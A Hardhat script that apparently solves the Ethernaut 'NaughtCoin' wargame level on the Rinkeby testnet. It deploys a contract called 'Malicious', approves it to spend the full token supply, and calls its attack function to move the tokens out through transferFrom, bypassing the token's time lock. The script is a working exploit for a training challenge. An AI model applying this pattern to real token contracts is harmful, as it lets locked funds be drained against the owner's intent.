/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const {deployed} = require('./deployed')
const INSTANCE = "0xF6cBf785D6ca2E7E58A2792F0e74E8f03EF76698"


async function instanceState(rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log('NAUGHTCOIN')
  console.log("\tStorage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("\tStorage '1'", await rinkeby.getStorageAt(INSTANCE, 1))
  console.log("\tStorage '2'", await rinkeby.getStorageAt(INSTANCE, 2))
  console.log("\tStorage '3'", await rinkeby.getStorageAt(INSTANCE, 3), '\n')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')

  let NaughtCoin = await hre.ethers.getContractFactory('NaughtCoin')
  let naughtCoin = await NaughtCoin.attach(INSTANCE)
  console.log('naughtCoin functions')
  console.log(naughtCoin.functions, '\n')

  // STEP 1
  //----------------------------------------------------------------------
  // Deploy our malicious contract
  console.log("Deploying our malicious contract...")
  let Malicious = await hre.ethers.getContractFactory('Malicious')
  let malicious = await Malicious.deploy(INSTANCE)
  await malicious.deployed()

  await deployed("Malicious", hre.network.name, malicious.address)
  console.log('malicious functions')
  console.log(naughtCoin.functions, '\n')
  //----------------------------------------------------------------------
  
  
  await instanceState(rinkeby, malicious)
  
  
  // STEP 2
  //----------------------------------------------------------------------
  // Approve our malicious contract to transfer our brand new coins
  const supply = await naughtCoin.INITIAL_SUPPLY()
  console.log("Approving our malicious contract to transfer...")
  const tx = await naughtCoin.approve(malicious.address, supply)
  await tx.wait()
  console.log("transaction confirmed !")
  //----------------------------------------------------------------------
  
  
  // STEP 3
  //----------------------------------------------------------------------
  // Attack !!
  console.log("Transfert tokens from our malicious through a TransferFrom...")
  const tx2 = await malicious.attack(supply)
  await tx2.wait()
  console.log("transaction confirmed !")
  //----------------------------------------------------------------------

  console.log("Balance of our malious contract:", await naughtCoin.balanceOf(malicious.address))  
  await instanceState(rinkeby)


  console.log("You win !")
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
